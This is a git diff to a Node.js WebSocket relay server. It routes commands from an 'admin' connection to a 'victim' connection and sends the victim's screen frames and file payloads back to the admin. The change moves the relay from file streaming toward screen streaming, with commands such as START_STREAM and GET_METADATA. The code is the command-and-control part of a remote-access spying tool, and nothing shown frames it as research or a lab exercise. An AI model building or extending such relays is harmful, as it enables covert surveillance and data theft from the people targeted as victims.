@@ -26,15 +26,15 @@ wss.on('connection', (ws, req) => {
     }
 
     ws.on('message', (message) => {
-        // Handle both string text commands and binary buffers (file streams)
+        // Handle text commands (like START_STREAM, STOP_STREAM, GET_METADATA) and frame buffers
         const isBinary = Buffer.isBuffer(message);
-        const logContent = isBinary ? `[Binary Buffer: ${message.length} bytes]` : message.toString();
-        console.log(`Received message from [${role}]: ${logContent}`);
+        const logContent = isBinary ? `[Binary/Frame Buffer: ${message.length} bytes]` : message.toString();
+        console.log(`Received message from [${role}]: ${logContent.substring(0, 100)}...`);
 
         if (role === 'admin') {
             if (victimSocket && victimSocket.readyState === WebSocket.OPEN) {
                 victimSocket.send(message);
-                console.log('-> Successfully forwarded command/payload to Victim.');
+                console.log('-> Successfully forwarded command to Victim.');
             } else {
                 console.log('-> ROUTING FAILED: Victim socket is null or not OPEN.');
                 if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
@@ -44,7 +44,7 @@ wss.on('connection', (ws, req) => {
         } else if (role === 'victim') {
             if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
                 adminSocket.send(message);
-                console.log('-> Successfully forwarded data payload/file to Admin.');
+                console.log('-> Successfully forwarded screen frame/payload to Admin.');
             } else {
                 console.log('-> ROUTING FAILED: Admin socket is null or not OPEN.');
             }
